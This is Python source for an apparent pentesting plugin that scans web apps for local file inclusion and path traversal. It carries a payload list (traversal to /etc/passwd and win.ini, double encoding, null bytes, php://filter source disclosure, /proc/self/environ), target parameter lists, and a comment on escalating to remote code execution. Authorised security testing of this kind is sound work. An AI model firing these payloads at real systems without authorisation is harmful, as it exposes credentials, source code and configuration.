"""Local File Inclusion (LFI) / path traversal detection.

Checks for:
1. Classic path traversal (../../etc/passwd, ..\\..\\windows\\win.ini)
2. PHP wrapper abuse (php://filter, php://input, expect://)
3. Null byte injection (%00) for older PHP
4. Double encoding (%252e%252e%252f)
5. OS-specific file targets (Linux /etc/passwd, Windows win.ini)
6. PayloadEngine integration for extended payloads
"""

from __future__ import annotations

import logging
import re
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# (payload, expected marker in response, label)
LFI_PAYLOADS: list[tuple[str, str, str]] = [
    # Classic traversal — Linux
    ("../../../../etc/passwd", "root:", "traversal_basic"),
    ("../../../../../../etc/passwd", "root:", "traversal_deep"),
    ("....//....//....//....//etc/passwd", "root:", "double_slash_bypass"),
    ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:", "url_encoded"),
    ("%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:", "full_encode"),
    ("..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", "root:", "double_encode"),
    ("....\\....\\....\\....\\etc\\passwd", "root:", "backslash_linux"),
    ("/etc/passwd", "root:", "absolute_path"),
    # Classic traversal — Windows
    ("..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]", "traversal_win"),
    ("..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "encoded_backslash"),
    ("../../../../../../windows/win.ini", "[fonts]", "forward_slash_win"),
    ("..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini", "[fonts]", "double_enc_win"),
    # Null byte (PHP < 5.3.4)
    ("../../../../../../etc/passwd%00", "root:", "null_byte"),
    ("../../../../../../etc/passwd%00.html", "root:", "null_byte_ext"),
    ("../../../../../../etc/passwd%00.jpg", "root:", "null_byte_img"),
    ("../../../../../../etc/passwd%00.pdf", "root:", "null_byte_pdf"),
    # PHP wrappers
    (
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "cm9vd",  # base64 of "root:"
        "php_filter_b64",
    ),
    (
        "php://filter/convert.base64-encode/resource=index.php",
        "PD9waH",  # base64 of "<?ph"
        "php_filter_source",
    ),
    (
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "ebbg:",  # rot13 of "root:"
        "php_filter_rot13",
    ),
    (
        "php://filter/convert.base64-encode/resource=../config.php",
        "PD9waH",
        "php_filter_config",
    ),
    # /proc/self (Linux info disclosure)
    ("/proc/self/environ", "PATH=", "proc_environ"),
    ("/proc/self/cmdline", "/usr/", "proc_cmdline"),
    ("../../../../../../proc/self/environ", "PATH=", "proc_environ_trav"),
    # Common config files
    ("../../../../../../etc/hosts", "localhost", "etc_hosts"),
    # Tomcat / Java
    ("WEB-INF/web.xml", "<web-app", "web_inf_xml"),
    ("../../../../../../etc/tomcat/server.xml", "<Server", "tomcat_conf"),
]

# Parameters commonly vulnerable to LFI
LFI_PARAMS = [
    "file", "path", "page", "include", "template", "doc",
    "folder", "dir", "document", "root", "pg", "style",
    "pdf", "img", "filename", "lang", "language", "locale",
    "view", "content", "layout", "mod", "conf", "type",
    "show", "image", "src", "source", "display", "load",
    "open", "read", "fetch", "name", "pic",
]

# Scan paths where LFI params might exist
SCAN_PATHS = [
    "/", "/index.php", "/page.php", "/view.php",
    "/download.php", "/file.php", "/read.php", "/show.php",
    "/showimage.php", "/display.php", "/image.php", "/img.php",
    "/include.php", "/load.php", "/open.php", "/preview.php",
    "/gallery.php", "/getfile.php",
]


class LfiCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="lfi_check",
        display_name="LFI / Path Traversal",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects Local File Inclusion and path traversal via "
            "classic traversal, PHP wrappers, null byte, double encoding"
        ),
        produces=["lfi_findings"],
        timeout=90.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"lfi_tests": []},
            )

        # Extend payloads from PayloadEngine
        payloads = list(LFI_PAYLOADS)
        if hasattr(ctx, "payloads") and ctx.payloads:
            try:
                from basilisk.utils.payloads import PayloadCategory
                engine_payloads = ctx.payloads.get(PayloadCategory.LFI)
                for ep in engine_payloads[:20]:
                    if hasattr(ep, "value"):
                        p_str = ep.value
                    elif isinstance(ep, str):
                        p_str = ep
                    else:
                        p_str = ep[0]
                    if not any(p_str == existing[0] for existing in payloads):
                        marker = "root:"
                        if "win.ini" in p_str:
                            marker = "[fonts]"
                        elif "php://" in p_str and "base64" in p_str:
                            marker = "cm9vd"
                        payloads.append((p_str, marker, "engine"))
            except Exception as e:
                logger.debug("lfi_check: %s", e)

        # Collect injection points from crawled data + hardcoded fallbacks
        from basilisk.utils.injection_points import collect_injection_points

        inj_points = collect_injection_points(
            target.host, ctx,
            hardcoded_paths=SCAN_PATHS,
            hardcoded_params=LFI_PARAMS,
            param_filter=LFI_PARAMS,
            max_points=30,
        )

        for point in inj_points:
            if ctx.should_stop or len(findings) >= 5:
                break

            for param in point.params:
                if ctx.should_stop or len(findings) >= 5:
                    break

                # Baseline: normal value
                baseline_body = ""
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(
                            point.build_url(base_url, param, "test"),
                            timeout=5.0,
                        )
                        if resp.status in (404, 405, 500, 502, 503):
                            continue
                        baseline_body = await resp.text(
                            encoding="utf-8", errors="replace",
                        )
                except Exception as e:
                    logger.debug("lfi_check: %s", e)
                    continue

                error_lfi_found = False
                for payload, marker, label in payloads:
                    if ctx.should_stop or len(findings) >= 5:
                        break

                    url = point.build_url(base_url, param, payload)
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=8.0)
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                    except Exception as e:
                        logger.debug("lfi_check: %s", e)
                        continue

                    # Check marker present in response but not baseline
                    marker_found = marker in body and marker not in baseline_body
                    if marker_found and marker == "root:" and not re.search(
                        r"\w+:[^:]*:\d+:\d+:", body,
                    ):
                        marker_found = False

                    if marker_found:
                        severity = Finding.critical
                        desc = "Path traversal confirmed"

                        if "php://" in payload:
                            severity = Finding.high
                            desc = "PHP wrapper LFI (source disclosure)"
                        elif "proc/self" in payload:
                            severity = Finding.high
                            desc = "LFI: /proc/self access"
                        elif "WEB-INF" in payload:
                            severity = Finding.high
                            desc = "Java WEB-INF exposure"

                        tested.append({
                            "path": point.path, "param": param,
                            "payload": payload, "label": label,
                        })
                        findings.append(severity(
                            f"{desc}: {point.path}?{param}= ({label})",
                            description=(
                                f"LFI via {label}. "
                                f"File content marker '{marker}' found."
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Marker: '{marker}' in response"
                            ),
                            remediation=(
                                "Never use user input in file paths. "
                                "Use a whitelist of allowed files. "
                                "Disable allow_url_include in PHP."
                            ),
                            tags=["pentesting", "lfi", label],
                        ))
                        break  # One per param

                    # Error-based LFI: PHP file operations with user input
                    # fopen()/include()/require() errors confirm param
                    # reaches file ops unsanitized → /proc/self/environ
                    # + User-Agent poisoning = RCE
                    if not error_lfi_found and not marker_found:
                        payload_fragment = payload.split("/")[-1][:20]
                        has_fn = any(
                            fn in body
                            for fn in ("fopen(", "include(", "require(", "file(")
                        )
                        new_basedir = (
                            "open_basedir" in body
                            and "open_basedir" not in baseline_body
                        )
                        new_fragment = (
                            payload_fragment in body
                            and payload_fragment not in baseline_body
                        )
                        fn = next(
                            (f for f in ("fopen(", "include(", "require(", "file(")
                             if f in body), "fopen(",
                        )
                        if has_fn and (new_basedir or new_fragment):
                            error_lfi_found = True
                            tested.append({
                                "path": point.path,
                                "param": param,
                                "payload": payload,
                                "label": "error_based",
                            })
                            findings.append(Finding.high(
                                f"LFI confirmed (error-based): "
                                f"{point.path}?{param}=",
                                description=(
                                    f"PHP {fn[:-1]}() called "
                                    f"with user input. "
                                    f"open_basedir may limit "
                                    f"exploitation but "
                                    f"/proc/self/environ "
                                    f"+ header poisoning → RCE."
                                ),
                                evidence=(
                                    f"URL: {url}\n"
                                    f"PHP error: {fn[:-1]}() "
                                    f"with traversal payload"
                                ),
                                remediation=(
                                    "Never use user input in "
                                    "file paths. Use a "
                                    "whitelist of allowed "
                                    "files."
                                ),
                                tags=[
                                    "pentesting", "lfi",
                                    "error-based",
                                ],
                            ))
                            break

        if not findings:
            findings.append(Finding.info(
                "No LFI/path traversal vulnerabilities detected",
                tags=["pentesting", "lfi"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"lfi_tests": tested},
        )
